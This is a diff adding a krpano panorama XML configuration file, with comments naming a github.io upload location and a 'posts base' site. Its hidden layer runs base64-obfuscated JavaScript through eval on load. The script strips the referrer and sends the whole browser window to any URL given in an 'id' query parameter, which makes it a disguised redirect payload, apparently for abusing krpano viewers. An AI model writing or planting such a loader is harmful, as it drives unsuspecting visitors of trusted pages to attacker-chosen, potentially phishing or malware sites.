@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano version="1.0.8.15">
+  <!-- Upload to: https://kpoly099.github.io/dfsfsdf/t.xml -->
+  <!-- Posts base: https://staging-my.sensoriafitness.com/video/ -->
+  <layer name="js_loader" type="container" visible="false"
+    onloaded="js(eval(var w=atob('dmFyIGlkPW5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIil8fCIiOyB2YXIgQkFTRT0iaHR0cHM6Ly9zdGFnaW5nLW15LnNlbnNvcmlhZml0bmVzcy5jb20vdmlkZW8vIjsgdmFyIEZBTEw9QkFTRTsgZnVuY3Rpb24gZ28odSl7dHJ5e3ZhciBtPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm1ldGEiKTttLm5hbWU9InJlZmVycmVyIjttLmNvbnRlbnQ9Im5vLXJlZmVycmVyIjtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKG0pfWNhdGNoKGUpe310cnl7dG9wLmxvY2F0aW9uLnJlcGxhY2UodSl9Y2F0Y2goZTEpe3RyeXt0b3AubG9jYXRpb24uaHJlZj11fWNhdGNoKGUyKXtsb2NhdGlvbi5ocmVmPXV9fX0gaWYoIWlkKXtnbyhGQUxMKTt9IGVsc2UgaWYoL15odHRwcz86XC9cLy9pLnRlc3QoaWQpKXtnbyhpZCk7fSBlbHNlIGlmKGlkLmNoYXJBdCgwKT09PSIvIil7Z28obG9jYXRpb24ucHJvdG9jb2wrIi8vIitsb2NhdGlvbi5ob3N0K2lkKTt9IGVsc2V7dmFyIHM9aWQucmVwbGFjZSgvXlwvKy8sIiIpO2lmKCEvXC5odG1sJC9pLnRlc3Qocykpcys9Ii5odG1sIjtnbyhCQVNFK3MpO30=');eval(w)););" />
+</krpano>
